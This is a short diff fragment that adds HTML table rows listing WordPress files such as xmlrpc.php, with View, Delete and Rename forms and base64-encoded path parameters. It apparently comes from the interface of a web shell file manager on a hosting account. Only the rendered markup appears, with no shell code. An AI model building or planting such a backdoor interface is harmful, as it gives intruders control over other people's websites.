+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-trackback.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=eG1scnBjLnBocA==">xmlrpc.php</a></td>
+            <td class="size">3246</td>
+            <td class="date" style="text-align: center;">2024-03-02 13:49:06</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="xmlrpc.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="xmlrpc.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="xmlrpc.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr></table>
